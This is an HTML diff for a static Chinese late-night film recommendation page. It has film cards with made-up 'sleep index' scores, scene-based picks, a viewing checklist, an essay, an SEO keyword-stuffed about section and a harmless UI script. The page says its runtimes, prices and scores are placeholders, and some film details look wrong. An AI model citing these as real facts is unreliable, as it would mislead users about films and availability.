+      <article class="pick"><div class="cvr" style="background:linear-gradient(160deg,#7a8a4a,#3d4a2a)"><span class="glow"></span><span class="sl">助眠 92</span><b>恋恋风尘</b></div><div class="body"><div class="hd"><h4>恋恋风尘</h4><span class="pill d">会员免费</span></div><p>侯孝贤 1986。火车站、铁轨、云、蝉鸣。最后一镜 180 秒，什么也没发生，只有风。长镜头是天然的安眠药。</p><span class="ft"><span>2K 修复 →</span><span>105 MIN</span></span></div></article>
+      <article class="pick"><div class="cvr" style="background:linear-gradient(160deg,#8a6a4a,#4a3524)"><span class="glow"></span><span class="sl">助眠 90</span><b>早安</b></div><div class="body"><div class="hd"><h4>早安</h4><span class="pill y">公版</span></div><p>小津安二郎 1959。两个小男孩决定"不再说话"。全片几乎靠眼神与沉默推进，是最适合"开着声音睡着"的喜剧。</p><span class="ft"><span>2K 修复 →</span><span>94 MIN</span></span></div></article>
+      <article class="pick"><div class="cvr" style="background:linear-gradient(160deg,#4a7a6a,#244035)"><span class="glow"></span><span class="sl">助眠 87</span><b>布米叔叔</b></div><div class="body"><div class="hd"><h4>能召回前世的布米叔叔</h4><span class="pill d">会员免费</span></div><p>阿彼察邦 2010。热带的雨、青蛙、牛、远处电视里的新闻。声音是叙事者，对白极少，<b>关掉字幕也能看懂</b>。</p><span class="ft"><span>2K 修复 →</span><span>114 MIN</span></span></div></article>
+      <article class="pick"><div class="cvr" style="background:linear-gradient(160deg,#3a3a4a,#1a1a24)"><span class="glow"></span><span class="sl">助眠 84</span><b>都灵之马</b></div><div class="body"><div class="hd"><h4>都灵之马</h4><span class="pill p">¥ 3.00</span></div><p>贝拉·塔尔 2011。六个白天，一口井，一匹马，一场不停的风。没有配乐，没有对白。<b>请不要在凌晨看</b>——它会让你彻底清醒。</p><span class="ft"><span>4K 修复 →</span><span>146 MIN</span></span></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目4：场景选片（Tabs + 深蓝侧栏） ============ -->
+<section class="sec" id="scene" style="background:linear-gradient(180deg,#fdfbf6,#f7f2e8)">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2 class="sec-t"><span class="tag">SCENE</span>按场景选片</h2>
+      <span class="sec-s">心情 × 天气 × 独居 × 下饭 × 失眠 × 重看</span>
+    </div>
+    <div class="guide">
+      <div class="tabs">
+        <div class="tab-hd" id="thd" style="--c:6">
+          <button class="on" data-t="t1">🌧 下雨天</button>
+          <button data-t="t2">🍚 下饭</button>
+          <button data-t="t3">🏠 独居</button>
+          <button data-t="t4">😴 失眠</button>
+          <button data-t="t5">🔁 重看</button>
+          <button data-t="t6">✈️ 通勤</button>
+        </div>
+        <div class="tab-bd on" id="t1"><h4>下雨天，适合听雨大于看画面的电影</h4><p>雨声会盖住对白，所以选<b>对白少、环境音重</b>的片子。阿彼察邦的雨林、侯孝贤的台风雨、塔可夫斯基的屋檐水，都是天然的雨声白噪音。<b>关掉字幕</b>，让雨替演员说话。</p><div class="chips"><i>布米叔叔 114min</i><i>恋恋风尘 105min</i><i>镜子 108min</i><i>一一 173min</i></div></div>
+        <div class="tab-bd" id="t2"><h4>下饭片：一顿饭能看完，吃完就忘</h4><p>标准是"<b>不费脑、有食物、不长</b>"。是枝裕和的厨房戏、小津的餐桌、李安的推手，都是最佳下饭菜。避免：贝拉·塔尔（吃生土豆，会倒胃口）、塔可夫斯基（没有饭，只有水）。</p><div class="chips"><i>步履不停 114min</i><i>饮食男女 124min</i><i>海街日记 127min</i><i>小森林 111min</i></div></div>
+        <div class="tab-bd" id="t3"><h4>独居：找一部"有人在说话"的电影</h4><p>一个人住的时候，最怕安静。<b>选对白密集、人物多、家常气</b>的片子，让声音填满房间。小津的大家庭、是枝裕和的兄弟姐妹、杨德昌的公寓，都是"有人陪你吃饭"的电影。</p><div class="chips"><i>东京物语 136min</i><i>步履不停 114min</i><i>一一 173min</i><i>海街日记 127min</i></div></div>
+        <div class="tab-bd" id="t4"><h4>失眠：不要看新片，重看一部看过的</h4><p>失眠时的大脑无法处理新信息。<b>请重看一部已经知道结局的电影</b>：侯孝贤《恋恋风尘》、是枝裕和《花之武者》、小津《晚春》。熟悉的画面是摇篮曲，陌生的剧情是加班。</p><div class="chips"><i>花之武者 91min</i><i>恋恋风尘 105min</i><i>晚春 108min</i><i>秋刀鱼之味 113min</i></div></div>
+        <div class="tab-bd" id="t5"><h4>重看：二刷才是真正的"福利"</h4><p>好电影的福利不在"发现剧情"，而在"发现细节"。二刷《一一》，你会注意到每个角色的时钟；二刷《悲情城市》，你会听懂收音机里的新闻。<b>建议：每年重看一部，十年后你会拥有十部不同的电影</b>。</p><div class="chips"><i>一一 173min</i><i>悲情城市 157min</i><i>镜子 108min</i><i>都灵之马 146min</i></div></div>
+        <div class="tab-bd" id="t6"><h4>通勤：35 分钟能看完的短片</h4><p>通勤不是看电影的场合，是<b>听电影</b>的场合。请选片长 ≤ 35 min 的短片或长片片段：阿彼察邦《湄公河酒店》17 min、李安《衣橱里的猫》17 min、是枝裕和《无人知晓》片段。<b>请戴耳机，但别开降噪</b>——你需要听见报站。</p><div class="chips"><i>湄公河酒店 17min</i><i>衣橱里的猫 17min</i><i>永恒和一日 127min（分段）</i></div></div>
+      </div>
+      <aside class="side">
+        <h4>午夜观影设置清单</h4>
+        <p class="sub">NIGHT MODE · CHECK LIST</p>
+        <dl>
+          <dt>01 亮度</dt><dd>把屏幕亮度降到 30% 以下。深夜的高亮是失眠的开关。</dd>
+          <dt>02 色温</dt><dd>开启"夜览 / 暖色"，色温 ≤ 3000K。蓝光会骗大脑"现在是中午"。</dd>
+          <dt>03 声音</dt><dd>用音箱，不用降噪耳机。长镜头的声音是"空间"的声音，耳机把它压扁了。</dd>
+          <dt>04 字幕</dt><dd>能关就关。字幕遮挡画幅下缘，会压住小津的留白与侯孝贤的远景。</dd>
+          <dt>05 插帧</dt><dd>关闭 MEMC / 运动补偿。24fps 的颤动是胶片的一部分，插帧会让口型错位 2 帧。</dd>
+          <dt>06 片尾</dt><dd>不要在最后一个画面消失时关掉。配乐常在这里才真正开始，留 4 分钟给回神。</dd>
+        </dl>
+        <div class="net"><span class="dot"></span>当前模式：暖光 · 音箱 · 原始画幅 · 字幕关</div>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目5：长文（报纸 masthead + 首字下沉 + 分栏） ============ -->
+<section class="sec" id="essay">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2 class="sec-t"><span class="tag">PAPER</span>深夜长文</h2>
+      <span class="sec-s">为什么 23:00 之后，值得看一部"不好看"的电影</span>
+    </div>
+    <article class="essay">
+      <div class="mh">
+        <div class="e">MIDNIGHT ESSAY · NO.07</div>
+        <h3>深夜的福利，是不必"看懂"</h3>
+        <div class="by">BY 神马午夜福利电影网 · 约 7 min 阅读 · 建议配合一盏暖灯</div>
+      </div>
+      <div class="in">
+        <p>有一类电影，白天看会觉得"闷"：没有反转，没有高潮，没有一句台词是"重要"的。但到了 23:40，灯关掉一半，窗外有风，你会突然听懂它——<b>因为它终于和你的心跳同频了</b>。</p>
+        <p>"午夜福利"这个词，通常被用错方向。真正的福利不是"多、快、免费、刺激"，而是"<b>可以慢慢来</b>"。白天我们被训练成"高效观众"：倍速、跳过、划走、只看解说。到了深夜，电影才把它的另一半还给你——<span style="color:var(--em)">那一半叫"时间"</span>。</p>
+        <blockquote>"长镜头不是导演偷懒，是给你时间，把白天来不及感受的东西，重新感受一遍。"</blockquote>
+        <p>所以神马午夜福利电影网想做一件很朴素的事：<b>按"还剩多少时间"给电影分类</b>。不是按类型、演员、热度，而是按四个硬指标：<span style="color:var(--em)">片长</span>（能不能一次看完）、<span style="color:var(--em)">对白密度</span>（能不能关字幕）、<span style="color:var(--em)">画面亮度</span>（会不会刺眼）、<span style="color:var(--em)">配乐强度</span>（会不会让人清醒）。再加上两个软指标：<span style="color:var(--em)">助眠指数</span>与<span style="color:var(--em)">是否适合重看</span>。</p>
+        <p>这套分类有个意外好处：<b>它不挑心情，只挑环境</b>。下雨天适合阿彼察邦（环境音重）；下饭适合是枝裕和（有厨房）；独居适合小津（有人说话）；失眠请重看侯孝贤（已知结局）；通勤请选短片（35 分钟内）。你不需要"想看点什么"，只需要回答一个问题：<span style="color:var(--em)">我现在，还能坐多久？</span></p>
+        <p>最后一条建议，也是最容易被忽略的一条：<b>请在片尾字幕开始时，再多坐四分钟</b>。长镜头的余韵在片尾字幕里，配乐也常在这里才真正开始。那四分钟，是电影留给你的、免费的、不可回放的时间。</p>
+        <p>今晚的片单：《步履不停》，114 分钟，助眠指数 96，正版免费。灯调暗，手机翻面，用音箱。如果中途睡着了，没关系——<b>你已经在看了</b>。</p>
+        <div class="end">— 晚安，明晚同一时间，换一部 —</div>
+      </div>
+    </article>
+  </div>
+</section>
+
+<!-- ============ 栏目6：关于 ============ -->
+<section class="sec" id="about">
+  <div class="wrap">
+    <div class="about">
+      <div class="lh">
+        <div>
+          <h2>神马午夜福利电影网<br>把<b>深夜</b>还给<u>电影</u></h2>
+          <p class="lead">神马午夜福利电影网（shenmawuyefulidianyingwang-cn.github.io）是<b>以深夜时段为索引的电影观影指南</b>。我们不堆片库、不追热度，只回答一个问题：<b>23:00 之后，我还能坐多久，该看什么？</b>馆藏按午夜四时段（23:00 饭后 / 23:40 夜深 / 00:20 失眠 / 01:00 凌晨）、助眠指数、导演、年代、胶片与修复状态五重索引，每部标注正版入口与观看成本，让你在 30 秒内决定今晚看什么、怎么看。</p>
+        </div>
+        <div class="stats">
+          <div><b>4,860</b><small>馆藏影片</small></div>
+          <div><b>6</b><small>深夜场景</small></div>
+          <div><b>40</b><small>部午夜片单</small></div>
+          <div><b>0</b><small>盗链广告</small></div>
+        </div>
+      </div>
+      <div class="feat">
+        <div><h4><span class="tk">01</span>正版福利优先</h4><p>每部标注 <b>正版免费 / 会员免费 / 单片付费 / 公版</b> 四种成本。优先推荐<b>平台免费专区、限时免费、版权到期公版老片、官方修复资料馆</b>。不搬运、不盗链、不破解、不写"未删减""禁片""磁力""破解会员"。</p></div>
+        <div><h4><span class="tk">02</span>助眠指数优先</h4><p>按<b>片长 / 对白密度 / 画面亮度 / 配乐强度</b>四项打分。标准是"<b>睡着也不可惜</b>"：静态构图、长镜头、黑白、极简对白、几乎没有配乐的片子，天然更助眠。</p></div>
+        <div><h4><span class="tk">03</span>重看优先</h4><p>失眠时的大脑无法处理新信息。<b>请重看一部已经知道结局的电影</b>：侯孝贤、是枝裕和、小津、杨德昌。熟悉的画面是摇篮曲，陌生的剧情是加班。</p></div>
+      </div>
+      <div class="siteinfo">
+        <p><b>网站名称：</b>神马午夜福利电影网 —— 深夜时段的电影福利指南 · 23:00 之后，看什么 · 午夜电影 · 深夜电影 · 失眠电影 · 助眠电影 · 睡前电影 · 夜间观影 · 治愈电影 · 安静电影 · 极简对白 · 长镜头 · 文艺片 · 慢电影 · 经典电影 · 高分电影 · 冷门佳片 · 免费电影 · 正版免费 · 限时免费 · 公版电影 · 4K 修复 · 电影推荐 · 正版电影 · 侯孝贤 · 是枝裕和 · 小津安二郎</p>
+        <p style="margin-top:8px"><b>网站网址：</b><a href="https://shenmawuyefulidianyingwang-cn.github.io/" style="color:var(--em)">https://shenmawuyefulidianyingwang-cn.github.io/</a></p>
+        <p style="margin-top:8px"><b>合规声明：</b>本演示页面为静态模板示例，影片名称、年份、片长、"助眠指数 96"、"馆藏 4,860 部"、"午夜榜 8 部"排序、"正版免费 / 会员免费 / 单片付费 / 公版"成本标签、价格等均为<b>示例占位数据，非实测值</b>，仅供界面展示与学习使用，不代表真实可观看状态、实际价格、版权归属或授权情况，一切以各平台当日页面为准。影视作品版权归原作者及版权方所有，请在正版平台确认版权、价格与地区限制后观看，支持创作者。本站<b>不提供任何破解账号、绕过付费或 DRM 的技术方法，不传播磁力链接、种子与网盘盗版资源</b>。"福利"一词在本站仅指"正版免费 / 限时免费的观影福利"，不含任何色情、赌博、诱导充值或成人内容；含暴力、血腥、成人题材的影片已标注 <b>18+</b>，建议成年人在清醒状态下观看；未成年人请在家长指导下使用本站。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 页脚 ============ -->
+<footer class="foot">
+  <div class="wrap">
+    <div class="f-top">
+      <div>
+        <a class="logo" href="#" style="font-size:17px"><span class="lm">午</span><span>神马午夜福利电影网<small>MIDNIGHT WELFARE</small></span></a>
+        <p style="margin-top:12px;max-width:440px">23:00 之后，值得一部"不好看"的电影。</p>
+      </div>
+      <div class="f-links">
+        <a href="#home">今晚看什么</a>
+        <a href="#slot">时段</a>
+        <a href="#rank">福利榜</a>
+        <a href="#pick">片单</a>
+        <a href="#scene">场景选片</a>
+        <a href="#essay">长文</a>
+        <a href="#about">关于</a>
+        <a href="#">正版来源</a>
+      </div>
+    </div>
+    <div class="f-cat">
+      <a href="#">神马午夜福利电影网</a>
+      <a href="#">午夜电影</a>
+      <a href="#">深夜电影</a>
+      <a href="#">失眠电影</a>
+      <a href="#">助眠电影</a>
+      <a href="#">睡前电影</a>
+    </div>
+    <div class="f-cat">
+      <a href="#">夜间观影</a>
+      <a href="#">下雨天电影</a>
+      <a href="#">下饭剧</a>
+      <a href="#">独居电影</a>
+      <a href="#">治愈电影</a>
+      <a href="#">安静电影</a>
+    </div>
+    <div class="copy">
+      © 2026 神马午夜福利电影网 shenmawuyefulidianyingwang　|　正版免费 · 限时免费 · 公版老片 · 助眠友好 · 4K 修复版优先　|　<a href="#" style="color:var(--em)">回到顶部 ↑</a><br>
+      <b>网站网址：https://shenmawuyefulidianyingwang-cn.github.io/</b>
+    </div>
+  </div>
+</footer>
+
+<script>
+/* 实时时钟 */
+function tick(){var d=new Date(),h=d.getHours(),m=d.getMinutes(),r=0;
+ if(h>=23){r=60-m;}else if(h<1){r=60-h*60-m;}else{r=0;}
+ document.getElementById('clock').textContent=(h<10?'0'+h:h)+':'+(m<10?'0'+m:m)+' · 距入睡 '+(r>0?r:'0')+' min';}
+tick();setInterval(tick,10000);
+/* 汉堡 */
+document.getElementById('hamb').addEventListener('click',function(){document.getElementById('menu').classList.toggle('open');});
+document.querySelectorAll('.menu a').forEach(function(a){a.addEventListener('click',function(){document.getElementById('menu').classList.remove('open');});});
+/* 滚动高亮 */
+window.addEventListener('scroll',function(){
+  var y=window.scrollY+150,cur='';
+  document.querySelectorAll('section[id]').forEach(function(s){if(s.offsetTop<=y)cur=s.id;});
+  document.querySelectorAll('.menu a').forEach(function(a){a.classList.toggle('on',a.getAttribute('href')==='#'+cur);});
+});
+/* Tabs */
+var tb=document.querySelectorAll('#thd button');
+tb.forEach(function(b){
+  b.addEventListener('click',function(){
+    tb.forEach(function(x){x.classList.remove('on');});
+    document.querySelectorAll('.tab-bd').forEach(function(x){x.classList.remove('on');});
+    b.classList.add('on');document.getElementById(b.dataset.t).classList.add('on');
+  });
+});
+</script>
+</body>
+</html>
